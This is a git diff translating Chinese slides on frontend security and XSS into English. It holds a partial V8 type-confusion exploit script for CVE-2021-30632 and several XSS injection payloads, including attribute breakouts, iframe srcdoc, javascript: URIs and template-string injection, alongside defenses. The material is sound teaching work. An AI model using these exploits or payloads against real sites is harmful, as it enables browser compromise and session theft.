@@ -37,7 +37,7 @@ fonts:
 
 # Frontend Security: An Introduction to XSS
 
-## aka 《Beyond XSS：探索網頁前端資安宇宙》 Ch1 讀書筆記
+## aka Reading Notes for Chapter 1 of Beyond XSS: Exploring the Web Front-end Security Universe
 
 <div class="mt-6">
 <p>speaker：Monica</p>
@@ -61,48 +61,64 @@ The last comment block of each slide will be treated as slide notes. It will be 
 
 ---
 
-# 前端資安的重要性
+# Why Frontend Security Matters?
 
-反過來說，資安漏洞會有什麼問題？
+Conversely, what problems can security vulnerabilities cause?
 
-- 資料外洩
-  - 使用者個人資料、商業機密、後台帳密
-- 財物損失
-  - 銀行帳戶、信用卡被盜用
-- 公司名譽受損
-  - 公司若無法保護使用者資料，可能面臨賠償或使用者流失
-- 不合相關法規
-  - 未遵守個資法、隱私權規定
-- 漏洞案例：[ZD-2022-00425 雲端租屋生活網 弱密碼](https://zeroday.hitcon.org/vulnerability/ZD-2022-00425)、[ZD-2022-00416 康軒電子書 FTP帳密洩漏](https://zeroday.hitcon.org/vulnerability/ZD-2022-00416)、[ ZD-2022-00323 弘爺漢堡 個資易讀取](https://zeroday.hitcon.org/vulnerability/ZD-2022-00323)
+- Data Leaks
+  - Users' personal information, business secrets, admin credentials
+- Financial Losses
+  - Stolen bank accounts, misused credit cards
+- Damage to Company Reputation
+  - If a company fails to protect user data, it could face compensation claims or loss of users
+- Vulnerability cases
+  - [ZD-2022-00425 雲端租屋生活網 弱密碼](https://zeroday.hitcon.org/vulnerability/ZD-2022-00425)
+  - [ZD-2022-00416 康軒電子書 FTP帳密洩漏](https://zeroday.hitcon.org/vulnerability/ZD-2022-00416)
+  - [ZD-2022-00323 弘爺漢堡 個資易讀取](https://zeroday.hitcon.org/vulnerability/ZD-2022-00323)
 
 ---
 
-# 瀏覽器的安全模型
-
-- 網頁前端程式在瀏覽器執行
-  - 瀏覽器負責 render HTML、解析 CSS、執行 JavaScript
-- 作業系統→應用程式（瀏覽器）→ 網頁前端 JavaScript
-  - 越內層限制越多
-    <img src="/image/frontend-js-in-browser.png" class="h-40" />
-- 前端做不到某些事，不是開發者不想做，是瀏覽器不允許
-  > 瀏覽器不給你的，你拿不到，拿不到就是拿不到
-
+```yaml
+layout: image-right
+image: /image/front-end-security-universe.png
+```
+# Front-end Security Universe
+- XSS is the largest "planet" in the front-end security universe, but there are many other security issues as well
+  - e.g. prototype pollution、CSS injection、XSLeaks
+- From a security standpoint, HTML, CSS, and JavaScript can be used in unexpected ways
 <!--
-Here is another comment.
+如果把網頁前端資安的領域比喻成一個宇宙的話，XSS 或許就是那顆最大最亮的星球，佔據了多數人的目光。但除了它以外，在宇宙中還有很多沒這麼大的行星與恆星，它一直都在那，你只是沒發現而已。
+除了 XSS 以外，還有很多值得學習的資安議題，例如說利用 JavaScript 特性的 prototype pollution、根本不需要 JavaScript 就能執行的 CSS injection 攻擊，或是網頁前端的旁路攻擊 XSLeaks 等等。
 -->
 
 ---
 
-# 瀏覽器的安全限制：禁止「主動」讀寫本機的檔案
+# Browser Security Model
 
-- 後端：程式在作業系統上執行，想做什麼都可以（沒特別限制的話）
-- 前端：
-  - 不能「主動」讀寫電腦裡面的檔案
-  - 可以「被動」讀取檔案
+- Web frontend programs run in the browser
+  - Browser is responsible for rendering HTML, parsing CSS, and executing JavaScript
+- Operating System → Application (Browser) → Web Frontend JavaScript
+  - The deeper the layer, the stricter the restrictions
+    <img src="/image/frontend-js-in-browser.png" class="h-40" />
+- Some tasks can't be done in the frontend simply because the browser doesn't allow them
+
+<br />
+
+> If the browser doesn’t give it to you, you can’t get it. 
+
+
+---
+
+# Browser Security Restrictions: No "Active" Access to Local Files
+
+- Backend: Programs run on the operating system and can do almost anything (unless specifically restricted)
+- Frontend:
+  - Cannot "actively" read or write files on the local machine
+  - Can "passively" read files
 
 <div class="ml-6">
 ```js
-// ⛔ 不能「主動」讀寫檔案
+// ⛔ cannot "actively" read or write files
 fetch("file:///data/index.html");
 window.open("file:///data/index.html");
 ```
@@ -110,8 +126,8 @@ window.open("file:///data/index.html");
 
 <div class="ml-6">
 
-```html {*}{maxHeight:'100px'}
-<!-- ✅ 可被動由使用者透過 input 選檔案後，再用 FileReader 讀取檔案內容 -->
+```html {*}{maxHeight:'60px'}
+<!-- ✅ can passively let users select a file via input, then use FileReader to read its contents -->
 <input type="file" onchange="show(this)" />
 
 <script>
@@ -127,40 +143,36 @@ window.open("file:///data/index.html");
 
 </div>
 
-- 如果瀏覽器可以主動讀寫檔案，會…?
-- 漏洞案例：[Bug Bounty Guest Post: Local File Read via Stored XSS in The Opera Browser](https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser/)
-  - 筆記頁網址「`opera:pinboards`」屬特殊協定，可開啟 `file://` 網頁、執行網頁截圖
+- If the browser could actively read and write files, it would...?
+- Vulnerability case: [Bug Bounty Guest Post: Local File Read via Stored XSS in The Opera Browser](https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser/)
+  - The note page "opera:pinboards" uses a special protocol, which can open `file://` pages
+
 
 ---
 
-# 瀏覽器安全限制：禁止呼叫系統 API
+# Browser Security Restrictions: Prohibit Calling System APIs
 
-- 瀏覽器有提供的 API，前端可以用
-
-  - ✅ `fetch` 發請求
-  - ✅ [Web Bluetooth API](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Bluetooth_API) 藍芽應用
-  - ✅ [MediaDevices](https://developer.mozilla.org/zh-CN/docs/Web/API/MediaDevices) 取得麥克風攝影機
-    > 同時實作權限管理，要使用者主動允許權限，網頁才能取得
-
-- 瀏覽器沒提供的系統 API，前端無法用
-  - 前端無法修改系統、網路設定
-  - 不是 JavaScript 做不到，JavaScript 只是語言，是執行環境瀏覽器沒提供 API
+- The frontend can use APIs provided by the browser
+  - ✅ `fetch` to make requests
+  - ✅ [Web Bluetooth API](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Bluetooth_API) for Bluetooth applications
+  - ✅ [MediaDevices](https://developer.mozilla.org/zh-CN/docs/Web/API/MediaDevices) to access microphones and cameras (requires user permission)
+- The frontend cannot use system APIs not provided by the browser
+  - The frontend cannot modify system or network settings
+  - It’s not that JavaScript can’t do it — JavaScript is just a language; it's the browser execution environment that doesn't provide these APIs
 
 ---
 
-# 瀏覽器安全限制：禁止存取其他網頁的內容
+# Browser Security Restrictions: Prohibition of Accessing Content from Other Web Pages
 
-> 一個網頁永遠不該有權限存取到其他網頁內容
+> A webpage should never have access to the content of other webpages.
 
-- 同源政策（[same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy), SOP）：每個網頁只有針對自己的權限
-  - 可以改自己的 HTML、執行自己的 JavaScript
-  - 不該取得其他網頁的資料
-- 所謂「資料」，不只是頁面內容，連網址都不行
-
+- Same-Origin Policy ([SOP](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)): Each webpage only has permissions for its own resources
+  - It can modify its own HTML and execute its own JavaScript
+  - It should not access data from other webpages, including URLs
 <div class='ml-6'>
 
 ```js
-// 如果在 github.com 的 console 執行...?
+// What happens if you run this in GitHub.com's console?
 var win = window.open("https://www.goplayone.com/");
 setTimeout(() => {
   console.log(win.location.href);
@@ -169,72 +181,76 @@ setTimeout(() => {
 
 </div>
 
-- 漏洞案例：Google Project Zeror 團隊發表的漏洞 Meltdown 與 Specture
-  - 問題：可透過 CPU 缺陷存取同 process 的資料
-  - 解法：Chrome 調整架構，不同網頁無論用什麼方式載入（e.g. 圖片、iframe），都用不同 process 處理
-    - → [Site Isolation](https://www.chromium.org/Home/chromium-security/site-isolation/)
+- Vulnerability case: Meltdown and Spectre, revealed by Google's Project Zero
+  - Issue: CPU flaws allowed data access within the same process
+  - Solution: Chrome now isolates each webpage into separate processes, no matter how they are loaded (e.g. images, iframes) → [Site Isolation](https://www.chromium.org/Home/chromium-security/site-isolation/)
 
 ---
 
-# 瀏覽器安全限制：禁止存取其他網頁的內容
+# Browser Security Restrictions: Prohibition of Accessing Content from Other Web Pages
 
-- 漏洞案例：[Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank](https://issues.chromium.org/issues/40060755)
-  - 問題：可透過 `iframe` 讀取另一個 cross-origin 頁面的網址
-    - 現在的網址是 `a.example.com`，裡面 `iframe` 網址是 `b.example.com`
-    - `frames[0].location = 'about:blank'` 重導向後，`iframe` 就會跟 `a.example.com` 同 origin
-    - 讀 `iframe` 歷史紀錄 `frames[0].navigation.entries()`，可拿到 `b.example.com` 網址
-    - 🔺 iframe 重導向後，`navigation.entries()` 就該清空
-  - 讀到網址會有什麼問題？
-    <img src="/image/problem-of-reading-iframe-url.png" class="h-40" />
+- Vulnerability case：[Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank](https://issues.chromium.org/issues/40060755)
+  - Issue: An `iframe` can be used to read the URL of a cross-origin page
+    - Current URL is `a.example.com`, iframe URL is `b.example.com`
+    - Redirecting `frames[0].location = 'about:blank'` makes the iframe same-origin with `a.example.com`
+    - Using `frames[0].navigation.entries()`, the `b.example.com` URL can be accessed
+    - 🔺 The iframe’s history should be cleared after redirection
+---
+
+# Browser Security Restrictions: Prohibition of Accessing Content from Other Web Pages
+- Vulnerability case：[Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank](https://issues.chromium.org/issues/40060755)
+  - Why is reading the URL a problem?
+    <img src="/image/problem-of-reading-iframe-url.png" class="h-60" />
 
 ---
 
-# 嚴重漏洞：RCE
+# Critical Vulnerability: RCE
 
-- 遠端程式碼執行（Remote Code Execution, RCE）
-  - 攻擊者可鑽瀏覽器的漏洞，並用 JavaScript 在電腦上執行任意指令
-  - 如：打開 `https://blog.huli.tw/` 讀文章後關掉，但部落格的 JavaScript 利用 RCE 漏洞對電腦下指令
-- 漏洞案例：CVE-2021-30632
-  - 問題：只要用 Chrome（v93 前）打開網頁，攻擊者即可入侵電腦並執行指令
-  - 漏洞原理：利用 JavaScript V8 引擎為改善效能的 bug
-    - V8 會做些改善效能的事，如：直接編譯經常執行的程式碼，之後直接執行編譯後的程式碼
+- Remote Code Execution (RCE)
+  - Attackers can exploit browser flaws to run arbitrary commands via JavaScript
+  - e.g. after visiting https://blog.huli.tw/, the site's JavaScript exploits an RCE bug to control your computer
+- Vulnerability case: CVE-2021-30632
+  - Issue: Opening a webpage in Chrome (pre-v93) let attackers run commands on your computer
+  - Vulnerability mechanism: It exploited a bug in the JavaScript V8 engine, which improves performance by compiling frequently executed code for direct execution later
 
 <div class='ml-12'>
 
 ```js {*}{maxHeight:'100px'}
-// 此程式被優化(編譯)過，以組合語言方式思考
+// This function is optimized (compiled), think of it in terms of assembly language
 function oobRead() {
   return x[20];
 }
-// 如果 x 是 double 型別陣列，每個 double 8 個 byte，oobRead 會固定去取 x + 20*8 這記憶體位置的內容(也就是 x + 160)
-// 如果 x 是長度 30 的 int 陣列，總長度是 4*30 = 120，那 x+160 就超出位置，讀到不該讀取的記憶體位置 -> OOB read(Out-Of-Bounds read)
+// If x is a double array, each double takes 8 bytes, so oobRead will always access the memory at x + 20*8 (which is x + 160)
+// If x is an int array with a length of 30, the total length is 4*30 = 120, meaning x + 160 exceeds the bounds and reads memory it shouldn't -> OOB read (Out-Of-Bounds read)
 ```
 
 </div>
 
 <div class='note-block'>
-💡 V8 引擎運作可參考<a href="https://medium.com/starbugs/%E5%9F%B7%E8%A1%8C-javascript-%E7%9A%84-v8-%E5%BC%95%E6%93%8E%E5%81%9A%E4%BA%86%E4%BB%80%E9%BA%BC-f97e5b4b3fbe" target="_blank">這篇文章</a>，V8 引擎編譯 JavaScript 時採 Just-In-Time（JIT）方式，JIT 結合解釋和編譯，執行 JavaScript 時，能分析程式碼執行過程的情報，並在取得足夠情報時，將相關程式碼再編譯成效能更快的機器碼。
+<!-- 💡 V8 引擎運作可參考<a href="https://medium.com/starbugs/%E5%9F%B7%E8%A1%8C-javascript-%E7%9A%84-v8-%E5%BC%95%E6%93%8E%E5%81%9A%E4%BA%86%E4%BB%80%E9%BA%BC-f97e5b4b3fbe" target="_blank">這篇文章</a>，V8 引擎編譯 JavaScript 時採 Just-In-Time（JIT）方式，JIT 結合解釋和編譯，執行 JavaScript 時，能分析程式碼執行過程的情報，並在取得足夠情報時，將相關程式碼再編譯成效能更快的機器碼。 -->
+💡 Check out <a href="https://medium.com/starbugs/%E5%9F%B7%E8%A1%8C-javascript-%E7%9A%84-v8-%E5%BC%95%E6%93%8E%E5%81%9A%E4%BA%86%E4%BB%80%E9%BA%BC-f97e5b4b3fbe" target="_blank">this</a> to learn how V8 engine works. V8 uses Just-In-Time (JIT) compilation, combining interpretation and compilation. It analyzes code execution, gathers runtime data, and recompiles frequently used parts into optimized machine code. 
 </div>
 
 <!--
 V8 引擎會做些改善效能的事，舉例來說，add 函式總是接收兩參數，參數總是正整數，V8 可能將函式編譯成 machine code；當參數不符假設時再退回以前執行方式
+💡 V8 引擎運作可參考<a href="https://medium.com/starbugs/%E5%9F%B7%E8%A1%8C-javascript-%E7%9A%84-v8-%E5%BC%95%E6%93%8E%E5%81%9A%E4%BA%86%E4%BB%80%E9%BA%BC-f97e5b4b3fbe" target="_blank">這篇文章</a>，V8 引擎編譯 JavaScript 時採 Just-In-Time（JIT）方式，JIT 結合解釋和編譯，執行 JavaScript 時，能分析程式碼執行過程的情報，並在取得足夠情報時，將相關程式碼再編譯成效能更快的機器碼。
 -->
 
 ---
 
-# 嚴重漏洞：RCE
+# Critical Vulnerability: RCE
 
-- 漏洞案例：CVE-2021-30632
-  - 如何利用這漏洞？（[解析文章](https://medium.com/r?url=https%3A%2F%2Fsecuritylab.github.com%2Fresearch%2Fin_the_wild_chrome_cve_2021_30632%2F)）
-    - 讓 V8 認為傳入的 x 一定是 `double` 陣列，編譯成固定讀 `x + 160`，但實際 x 是 `int` 陣列，佔的空間比 `160` 小
-      - → 混淆型態（Type Confusion），達到讀取/寫入超出範圍的記憶體位置
-    - 搭配 [WebAssembly](https://developer.mozilla.org/en-US/docs/WebAssembly/Concepts) 特性，把編譯過的 WebAssembly 蓋掉，替換為任意程式碼 -> 任意程式碼執行
-  - 漏洞的程式碼[連結](https://github.com/CrackerCat/CVE-2021-30632/blob/main/CVE-2021-30632.html)
+- Vulnerability case: CVE-2021-30632
+  - How is this vulnerability exploited?（[detailed article](https://medium.com/r?url=https%3A%2F%2Fsecuritylab.github.com%2Fresearch%2Fin_the_wild_chrome_cve_2021_30632%2F)）
+    - Trick V8 into thinking `x` is always a `double` array, compiling it to read from a fixed location `x + 160`, but `x` is actually an `int` array with less memory
+      - → Type Confusion, allowing out-of-bounds memory read/write
+    - Use [WebAssembly](https://developer.mozilla.org/en-US/docs/WebAssembly/Concepts) to overwrite compiled code and replace it with arbitrary code → Arbitrary Code Execution
+  - Vulnerability code [link](https://github.com/CrackerCat/CVE-2021-30632/blob/main/CVE-2021-30632.html)
 
 <div class='ml-12'>
 
-```js{*}{maxHeight:'200px'}
-// 用來觸發 garbage collection 用的
+```js{*}{maxHeight:'180px'}
+// Function used to trigger garbage collection
 function gc() {
   for(var i = 0;i < ((1024*1024)); i++) {
     new String();
@@ -254,7 +270,7 @@ function oobWrite(addr) {
 x[24] = addr;
 }
 
-// 為了觸發 bug 做的前置準備
+// Preparations to trigger the bug
 var arr0 = new Array(10); arr0.fill(1);arr0.a = 1;
 var arr1 = new Array(10); arr1.fill(2);arr1.a = 1;
 var arr2 = new Array(10); arr2.fill(3); arr2.a = 1;
@@ -266,7 +282,7 @@ var arr = new Array(30); arr.fill(4); arr.a = 1;
 var b = new Array(1); b.fill(1);
 var writeArr = [1.1];
 
-// 讓 V8 去最佳化 foo
+// Optimize foo in V8
 for (let i = 0; i < 19321; i++) {
 if (i == 19319) arr2[0] = 1.1;
 foo(arr1);
@@ -274,16 +290,16 @@ foo(arr1);
 
 x[0] = 1.1;
 
-// 讓 V8 去最佳化 oobRead 這函式
-// 此時 V8 認為 oobRead 裡面的 x 一定是 double 型別
+// Optimize oobRead function in V8
+// At this point, V8 assumes that x in oobRead is always of type double
 for (let i = 0; i < 20000; i++) {
 oobRead();
 }
 
-// 讓 V8 去最佳化 oobWrite 這函式
+// Optimize oobWrite function in V8
 for (let i = 0; i < 20000; i++) oobWrite(1.1);
 
-// 利用漏洞讓 x 變回 int，但 V8 仍認為 x 是 double
+// Exploit the bug, making x an int array, but V8 still assumes x is double
 foo(arr);
 
 var view = new ArrayBuffer(24);
@@ -292,7 +308,7 @@ var intView = new Int32Array(view);
 var bigIntView = new BigInt64Array(view);
 b[0] = instance;
 
-// 讀取到不該讀取的記憶體位置
+// Read from out-of-bounds memory location
 var addrs = oobRead();
 
 ```
@@ -301,14 +317,14 @@ var addrs = oobRead();
 
 ---
 
-# XSS 是什麼
+# What is XSS?
 
-- 全名 Cross-site scripting，簡稱 XSS
-- XSS 代表攻擊者可在其他人網站上執行 JavaScript 程式碼
-- 範例
-  - 瀏覽 `index.php?name=monica`，頁面出現：「Hello, monica」
-  - 瀏覽 `index.php?name=<script>alert(1)</script>`，頁面內容變成 `Hello, <script>alert(1)</script>`
-    - `<script>` 會被當成 JavaScript 程式執行，頁面跳出 alert
+- Full name: Cross-site scripting (XSS)
+- XSS allows attackers to execute JavaScript on other people's websites
+- Example
+  - Visit `index.php?name=monica`, the page shows: "Hello, monica"
+  - Visit `index.php?name=<script>alert(1)</script>`, the page becomes: `Hello, <script>alert(1)</script>`
+    - The `<script>` tag is executed as JavaScript, triggering an alert popup
 
 <div class='ml-12'>
 
@@ -322,32 +338,32 @@ var addrs = oobRead();
 
 ---
 
-# 達成 XSS 會怎樣？
+# What happens if XSS is achieved?
 
-- 達成 XSS 可以...
+- With XSS, attackers can...
 
-  - 偷別人的 `localStorage`
-  - 如果沒有設 HttpOnly 的 cookie，可用 `document.cookie` 拿到 cookie
-  - 如果偷不到 cookie，可直接用 `fetch()` 呼叫 API，以受害者身分發請求
-    <br />
-    （有無拿到 token，會影響可攻擊的範圍與攻擊的時間限制）
+  - Steal `localStorage` data
+  - Access cookies via `document.cookie` if HttpOnly is not set
+  - If cookies can't be stolen, use `fetch()` to make API requests as the victim
 
-- 防範 XSS 案例：更改密碼或進行敏感操作時，要再輸入現在的密碼或第二組密碼
+（Having the token affects the scope and duration of the attack）
+
+- XSS Prevention Example: require current or secondary passwords when changing sensitive information
 
 ---
 
-# XSS 的來源與分類
+# Sources of XSS
 
-- 為何有 XSS 問題？
-  - 因為直接在頁面顯示使用者輸入，使用者可藉機輸入惡意 payload 植入 JavaScript 程式碼
+- Why XSS happens?
+  - User input is directly displayed on the page, allowing attackers to inject malicious JavaScript
 
-看待 XSS 的角度：
+Viewing XSS:
 
-#### 1. 內容是如何被放到頁面上的
+#### 1. How the content is placed on the page
 
-- 從後端放上：如上 PHP 範例，攻擊者內容直接在後端輸出
-  - 瀏覽器收到 HTML 時，裡面已有 XSS payload
-- 從前端放上
+- From the backend: like the PHP example, the attacker's input is directly output by the backend
+  - The XSS payload is already in the HTML when the browser receives it
+- From the frontend
 <div class='ml-6'>
 
 ```html {*}{maxHeight:'120px'}
@@ -357,69 +373,67 @@ var addrs = oobRead();
   const name = qs.get("name");
   document.querySelector("#name").innerHTML = name;
 </script>
-<!-- 可透過 index.html?name=<script>alert(1)</script> 植入想要的內容
-從前端輸出內容，innerHTML 將 payload 新增到頁面
+<!-- You can inject content via index.html?name=<script>alert(1)</script>
+Output content from the frontend, innerHTML adds the payload to the page.
 
-💡 補充：innerHTML 注入的 <script> 不會有效果 -->
+💡 Note: <script> injected via innerHTML won't execute. -->
 ```
 
 </div>
 
-- 區分輸出方式：檢視網頁原始碼
 
 ---
 
-# XSS 的來源與分類
+# Sources of XSS
 
 <br class='hidden'/>
-看待 XSS 的角度：
+Viewing XSS:
 
-#### 2. Payload 有沒有被儲存
+#### 2. Whether the payload is stored
 
-- Payload 沒有被儲存
-  - 如：直接拿 query string 內容呈現在頁面
-    - 攻擊方式：點擊帶有 XSS 的連結
-    - 攻擊對象：點擊的那個人
-- Payload 有被儲存
-  - 如：留言板/貼文插入 HTML，並帶有 `<script>`
-    - 攻擊方式：插入 `<script>` 的留言
-    - 攻擊對象：任何觀看這留言板/貼文的人
-    - → 可變 wormable，擴大攻擊範圍
+- Payload not stored
+  - e.g. displaying query string content directly on the page
+    - Attack method: Clicking a link with XSS
+    - Target: The person who clicks the link
+- Payload stored
+  - e.g. inserting HTML with `<script>` in a comment or post
+    - Attack method: Posting a comment with `<script>`
+    - Target: Anyone who views the comment/post
+    - → Can become wormable, spreading the attack further
 
 ---
 
-# 其他 XSS 分類
+# Other XSS Types
 
 - Self-XSS
-  - 自己攻擊自己
-    - 如：打開網頁開發者工具，自己貼上 JavaScript 程式碼
-  - 只能攻擊到自己的 XSS
-    - 如：個人資料的電話號碼輸入框有 XSS 漏洞
-      - 只有自己才看得到 `alert()`（跟其他漏洞串接後，可能別人就看得到）
+  - attacking oneself
+    - e.g. pasting JavaScript into the browser's developer tools
+  - XSS that can only attack oneself
+    - e.g. XSS in a personal info input field (e.g. phone number)
+      - Only you see the `alert()` (but others might see it if combined with other vulnerabilities)
 - Blind XSS
-  - XSS 在你看不到的地方以及不知道的時間點被執行
-    - 如：電商平台每個欄位都沒 XSS 漏洞，但其實後台訂單資料有漏洞，可透過姓名欄位做 XSS
-  - 測試方式：將 payload 改成會傳送封包的
-  - 漏洞案例：[Blind Stored XSS Via Staff Name](https://hackerone.com/reports/948929)
+  - XSS is executed in places you can't see or at unknown times
+    - e.g. no XSS in an e-commerce platform's fields, but the admin order dashboard has an XSS vulnerability via the name field
+  - Test by making the payload send a request
+  - Vulnerability case: [Blind Stored XSS Via Staff Name](https://hackerone.com/reports/948929)
 
 ---
 
-# 能夠執行 JavaScript 的方式
+# Ways to Execute JavaScript
+Once you control the HTML, how can you execute JavaScript?
 
-掌控 HTML 後，要怎麼執行 JavaScript？
+#### `<script>` tag
 
-#### `<script>` 標籤
-
-- 容易被 [WAF(Web Application Firewall)](https://zh.wikipedia.org/zh-tw/%E7%B6%B2%E9%A0%81%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E9%98%B2%E7%81%AB%E7%89%86) 識別
-- 在 `innerHTML` 情境下無效
-  - 🔺 `innerHTML` 搭配 `iframe` 可執行 script
+- Easily detected by [WAF(Web Application Firewall)](https://zh.wikipedia.org/zh-tw/%E7%B6%B2%E9%A0%81%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E9%98%B2%E7%81%AB%E7%89%86)
+- Doesn't work in `innerHTML` context
+  - 🔺 `innerHTML` combined with iframe can execute scripts
 
 <div class='ml-6'>
 
 ```html
-<!-- iframe srcdoc 屬性可放完整 HTML 表示 iframe 的內容
-此 iframe 與當前頁 same-origin
-將 <script> 放在 srcdoc 屬性內就會執行 -->
+<!-- The iframe's srcdoc attribute can contain full HTML to define its content.
+This iframe is same-origin with the current page.
+A <script> placed in the srcdoc attribute will execute. -->
 
 document.body.innerHTML = `<iframe
   srcdoc="&lt;script>alert(1)&lt;/script>"
@@ -430,16 +444,15 @@ document.body.innerHTML = `<iframe
 </div>
 
 <div class='text-size-sm mt-12'>
-更多 payload：<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">Cross-site scripting (XSS) cheat sheet</a>
+More payloads: <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">Cross-site scripting (XSS) cheat sheet</a>
 </div>
 
 ---
 
-# 能夠執行 JavaScript 的方式
+# Ways to Execute JavaScript
+Once you control the HTML, how can you execute JavaScript?
 
-掌控 HTML 後，要怎麼執行 JavaScript？
-
-#### 屬性中的 event handler (都會是 on 開頭)
+#### Event handlers in attributes (starting with `on`)
 
 - `onerror`
 - `onload`
@@ -457,29 +470,28 @@ document.body.innerHTML = `<iframe
 
 ---
 
-# 能夠執行 JavaScript 的方式
+# Ways to Execute JavaScript
+Once you control the HTML, how can you execute JavaScript?
 
-掌控 HTML 後，要怎麼執行 JavaScript？
-
-#### `javascript:` 偽協議
+#### `javascript:` pseudo-protocol
 
 ```html
 <a href="javascript:alert(1)">Link</a>
 ```
 
 <div class='note-block mt-12'>
-💡 讓 a 連結點擊後沒反應的方式
+💡 How to make an <code>a</code> link unresponsive when clicked
 ```html
 <a href=javascript:void(0)>Link</a>
 ```
 </div>
 
 <div class='note-block'>
-💡 HTML 的簡寫
+💡 HTML shorthand
 <br />
-- HTML 屬性的雙引號<code>"</code>不是必要，如果內容沒空格，可拿掉雙引號
+- Double quotes <code>"</code> around HTML attributes are optional if there are no spaces
 <br />
-- HTML 標籤和屬性間空格可用 <code>/</code> 取代
+- Spaces between HTML tags and attributes can be replaced with <code>/</code>
 ```html
 <svg/onload=alert(1)>
 ```
@@ -487,14 +499,15 @@ document.body.innerHTML = `<iframe
 
 ---
 
-# 不同情境的 XSS 以及防禦方式
+# XSS in Different Scenarios and Defense Mechanisms
 
-> 注入點：可植入 payload 的地方
+- Injection point: the place where payload can be injected
+  - Different injection points impact attack methods and defenses
 
-#### 注入 HTML
+#### HTML Injection
 
-- 範例
-  - 可直接寫入任何想要元素
+- Example
+  - Can directly insert any desired element
 
 <div class='ml-6'>
 
@@ -504,7 +517,7 @@ document.body.innerHTML = `<iframe
 ?>
 ```
 
-```html
+```html {*}{maxHeight:'80px'}
 <div>Hello, <span id="name"></span></div>
 <script>
   const qs = new URLSearchParams(window.location.search);
@@ -515,17 +528,17 @@ document.body.innerHTML = `<iframe
 
 </div>
 
-- 防禦方法：編碼 `<` 和 `>`
+- Defense method: Encode `<` and `>`
 
 ---
 
-# 不同情境的 XSS 以及防禦方式
+# XSS in Different Scenarios and Defense Mechanisms
 
-#### 注入屬性
+#### Attribute Injection
 
-- 範例（[demo](https://cdpn.io/pen/debug/qBejjaq?authentication_hash=PBrNWpNGYgNA)）
-  - 先跳脫屬性、關閉標籤後再加入新標籤：`"><img src=not_exist onerror=alert(1)>`
-  - 跳脫屬性，加入 event handler：`" tabindex=1 onfocus="alert(1)" x="`
+- Example（[demo](https://cdpn.io/pen/debug/qBejjaq?authentication_hash=PBrNWpNGYgNA)）
+  - Escape the attribute, close the tag, add a new one: `"><img src=not_exist onerror=alert(1)>`
+  - Escape the attribute, add an event handler: `" tabindex=1 onfocus="alert(1)" x="`
 
 <div class='ml-6'>
 ```html {*}{maxHeight:'60px'}
@@ -542,33 +555,32 @@ document.body.innerHTML = `<iframe
 ```
 </div>
 
-- 防禦方法
-  - 編碼 `<>"'`
-  - 避免寫出沒有用引號包住的屬性
-    - 屬性沒有用引號包住，即使編碼 `<>"'` ，還是可用空格新增屬性（[demo](https://codepen.io/qpozkvnr-the-selector/pen/bGXRRaz)）
+- Defense methods
+  - Encode `<>"'`
+  - Avoid writing attributes without quotes
+    - Even with `<>"'` encoded, unquoted attributes can still be exploited using spaces（[demo](https://codepen.io/qpozkvnr-the-selector/pen/bGXRRaz)）
 
 <div class='ml-6'>
 ```js {3}{maxHeight:'60px'}
-// ⛔ 不要這樣寫
+// ⛔ Don't write it this way
 document.querySelector('#content').innerHTML = `
   <div class=${clazz}>
     Demo
-  </div>
-`
+  </div>`
 ```
 </div>
 
 ---
 
-# 不同情境的 XSS 以及防禦方式
+# XSS in Different Scenarios and Defense Mechanisms
 
-#### 注入 JavaScript
+#### JavaScript Injection
 
-- 使用者的輸入反映在 JavaScript 內（使用者輸入不可換行）
+- User input is reflected in JavaScript (input cannot contain line breaks)
 
 <div class='ml-6'>
 ```html {*}{maxHeight:'100px'}
-<!-- 可在 name payload 加入 </script> 提前關閉標籤，再加上其他標籤 -->
+<!-- Add </script> in the name payload to close the tag early and insert other tags -->
 <script>
   const name = "<?php echo $_GET['name'] ?>";
   alert(name);
@@ -576,11 +588,11 @@ document.querySelector('#content').innerHTML = `
 ```
 </div>
 
-- 用 template string 處理使用者輸入（使用者輸入可換行）
+- Use template strings to handle user input (input can include line breaks)
 
 <div class='ml-6'>
 ```html {*}{maxHeight:'100px'}
-<!-- 可在 name payload 加入 ${alert(1)} 來攻擊 -->
+<!-- Can inject ${alert(1)} in the name payload to launch an attack -->
 <script>
   const name = `
     Hello,
@@ -591,69 +603,67 @@ document.querySelector('#content').innerHTML = `
 ```
 </div>
 
-- 防禦方法
-  - 編碼 `<>"'`
-  - 對 template string 謹慎
+- Defense methods
+  - Encode `<>"'`
+  - Be cautious with template strings
 
 ---
 
-# 什麼是 javascript: 偽協議
+# What is the javascript: pseudo protocol?
 
-- 真協議如：`HTTP`、`HTTP`、`FTP`
-- 偽協議（pseudo protocol）如：`mailto:`、`tel:`、`javascript:`
-
-  - `javascript:` 偽協議可用來執行 JavaScript
-
-- 哪裡可用 `javascript:` 偽協議？
+- Real protocols: `HTTP`、`HTTP`、`FTP`
+- Pseudo protocols: `mailto:`、`tel:`、`javascript:`
+  - `javascript:` pseudo protocol can execute JavaScript
+- Where can the `javascript:` pseudo protocol be used?
 <div class='ml-6'>
 
-```html {*}{maxHeight:'220px'}
-<!-- 點擊後觸發 -->
+```html 
+<!-- Triggered on click -->
 <a href="javascript:alert(1)">Link</a>
 
-<!-- 不用任何操作就會觸發 -->
-<iframe src="javascript:alert(1)"></iframe>
-
-<!-- 點擊後觸發 -->
+<!-- Triggered on click -->
 <form action="javascript:alert(1)">
   <button>submit</button>
 </form>
 
-<!-- 點擊後觸發 -->
+<!-- Triggered on click -->
 <form id="f2"></form>
 <button form="f2" formaction="javascript:alert(2)">submit</button>
+
+<!-- Triggered without any action -->
+<iframe src="javascript:alert(1)"></iframe>
 ```
 
 </div>
 
 ---
 
-# javascript: 的危險性
